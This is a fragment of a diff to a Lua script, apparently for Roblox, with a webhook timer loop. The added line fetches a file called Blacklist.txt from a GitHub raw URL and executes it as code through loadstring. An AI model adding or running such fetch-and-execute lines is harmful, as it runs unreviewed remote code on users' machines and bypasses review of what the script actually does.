@@ -291,3 +291,5 @@ while wait(60) do
    ms = 1
    print("reset webhook timer thing")
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Blacklist.txt"))()
